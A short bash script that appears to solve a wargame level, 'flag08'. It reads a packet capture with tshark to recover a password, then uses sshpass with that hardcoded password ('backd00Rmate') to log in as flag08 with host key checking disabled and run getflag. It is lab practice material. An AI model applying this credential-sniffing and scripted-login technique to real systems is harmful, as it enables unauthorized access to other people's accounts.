#!/usr/bin/env bash

tshark -n -q -r /home/flag08/capture.pcap -z follow,tcp,hex,0

SSHPASS="backd00Rmate" sshpass -e -- \
    ssh -l flag08 -o StrictHostKeyChecking=no 127.0.0.1 getflag
